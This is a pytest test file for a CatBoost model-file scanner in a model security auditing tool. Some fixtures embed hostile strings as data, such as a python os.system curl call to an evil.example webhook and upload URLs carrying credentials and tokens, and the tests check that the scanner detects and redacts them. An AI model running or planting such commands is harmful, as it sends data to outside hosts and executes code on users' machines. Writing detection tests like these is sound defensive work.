"""Tests for CatBoost .cbm scanner."""

from __future__ import annotations

import struct
from pathlib import Path

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.catboost_scanner import CatBoostScanner
from modelaudit.utils.file.detection import detect_file_format, detect_file_format_from_magic


def _build_cbm(core_strings: list[str], trailing_strings: list[str] | None = None) -> bytes:
    core_blob = b"\x00".join(s.encode("utf-8") for s in core_strings)
    trailing_blob = b"\x00".join(s.encode("utf-8") for s in (trailing_strings or []))
    return b"CBM1" + struct.pack("<I", len(core_blob)) + core_blob + trailing_blob


def test_can_handle_valid_cbm_file(tmp_path: Path) -> None:
    model_path = tmp_path / "safe.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "loss_function",
                "metadata",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    assert CatBoostScanner.can_handle(str(model_path)) is True


def test_can_handle_rejects_non_cbm_content_with_cbm_extension(tmp_path: Path) -> None:
    fake_path = tmp_path / "renamed.cbm"
    fake_path.write_bytes(b"not a catboost model")

    assert CatBoostScanner.can_handle(str(fake_path)) is False


def test_can_handle_accepts_corrupt_cbm_magic_for_fail_closed_scan(tmp_path: Path) -> None:
    corrupt_path = tmp_path / "corrupt.cbm"
    corrupt_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    assert CatBoostScanner.can_handle(str(corrupt_path)) is True


def test_scan_benign_cbm_has_no_critical_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "benign.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "system_temperature",
                "exec_time_ms",
                "cat_feature_hash_to_string",
                "class_names",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)

    header_checks = [check for check in result.checks if check.name == "CatBoost Header Signature Check"]
    assert header_checks
    assert header_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_cbm_reports_structured_parse_failure(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.cbm"
    # Declared core size is larger than the available data.
    model_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["catboost_structure_parse_failed"]
    assert any(
        check.name == "CatBoost Core Section Bounds Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "CatBoost Structure Parsing" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_corrupt_cbm_aggregate_exit_code_is_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.cbm"
    model_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    metadata = result.file_metadata[str(model_path)]
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_structure_parse_failed" in metadata["scan_outcome_reasons"]
    assert result.success is False
    assert determine_exit_code(result) == 2


def test_scan_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unreadable.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "safe_metadata"]))

    def raise_os_error(
        _self: CatBoostScanner,
        _path: str,
        _file_size: int,
        _result: ScanResult,
    ) -> tuple[bytes, bytes, int, int]:
        raise OSError("simulated storage read failure")

    monkeypatch.setattr(CatBoostScanner, "_parse_sections", raise_os_error)

    direct = CatBoostScanner().scan(str(model_path))
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    read_checks = [check for check in direct.checks if check.name == "CatBoost File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "catboost_read_failed"
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_read_failed" in direct.metadata["scan_outcome_reasons"]
    metadata = aggregate.file_metadata[str(model_path)]
    assert "catboost_read_failed" in metadata["scan_outcome_reasons"]
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_scan_bounded_parse_marks_uninspected_catboost_bytes_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "safe_metadata" * 16], trailing_strings=["late-safe"]))

    result = CatBoostScanner(config={"catboost_core_scan_budget": 8, "catboost_trailing_scan_budget": 0}).scan(
        str(model_path)
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_bounded_parse_incomplete" in result.metadata["scan_outcome_reasons"]
    bounded_checks = [check for check in result.checks if check.name == "CatBoost Bounded Parse Check"]
    assert len(bounded_checks) == 1
    assert bounded_checks[0].status == CheckStatus.FAILED
    assert bounded_checks[0].details["analysis_incomplete"] is True


def test_scan_string_extraction_limit_marks_late_payload_analysis_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "safe_fragment_one",
                "safe_fragment_two",
                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
            ],
        ),
    )

    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.FAILED
    assert budget_checks[0].details["truncated_sections"] == ["core"]
    assert budget_checks[0].details["analysis_incomplete"] is True


def test_scan_string_extraction_exact_limit_preserves_clean_result(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings-benign.cbm"
    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))

    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.PASSED
    assert budget_checks[0].details["analysis_incomplete"] is False


def test_scan_string_extraction_limit_aggregate_is_inconclusive_and_uncached(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings.cbm"
    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            catboost_max_extracted_strings=1,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            catboost_max_extracted_strings=1,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for result in (first, second):
            metadata = result.file_metadata[str(model_path)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "catboost_string_extraction_limit_exceeded" in metadata["scan_outcome_reasons"]
            assert determine_exit_code(result) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
    model_path = tmp_path / "malicious.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
                "callback=https://evil.example/webhook",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    correlation_checks = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert correlation_checks
    assert correlation_checks[0].status == CheckStatus.FAILED
    assert correlation_checks[0].severity == IssueSeverity.CRITICAL


def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
    model_path = tmp_path / "network.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "download_url=https://collector.evil.example/upload",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    network_checks = [check for check in result.checks if check.name == "Network Indicator Check"]
    assert network_checks
    assert network_checks[0].status == CheckStatus.FAILED
    assert network_checks[0].severity == IssueSeverity.WARNING


def test_scan_redacts_urls_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "network_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                (
                    "python -c \"import os; os.system('curl "
                    "https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag')\""
                ),
                "download_url=https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "https://collector.evil.example/upload" in failed_details
    assert "cat_user" not in failed_details
    assert "cat_pass" not in failed_details
    assert "CATBOOST_SECRET" not in failed_details
    assert "#frag" not in failed_details


def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
    model_path = tmp_path / "false_positive_guard.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_system",
                "exec_time_ms",
                "system_feature_importance",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    command_correlation = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert command_correlation
    assert command_correlation[0].status == CheckStatus.PASSED
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_catboost_regression_routes_to_catboost_scanner(tmp_path: Path) -> None:
    model_path = tmp_path / "route.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "loss_function"]))

    scanner = get_scanner_for_file(str(model_path))

    assert scanner is not None
    assert scanner.name == "catboost"

    assert detect_file_format_from_magic(str(model_path)) == "catboost"
    assert detect_file_format(str(model_path)) == "catboost"
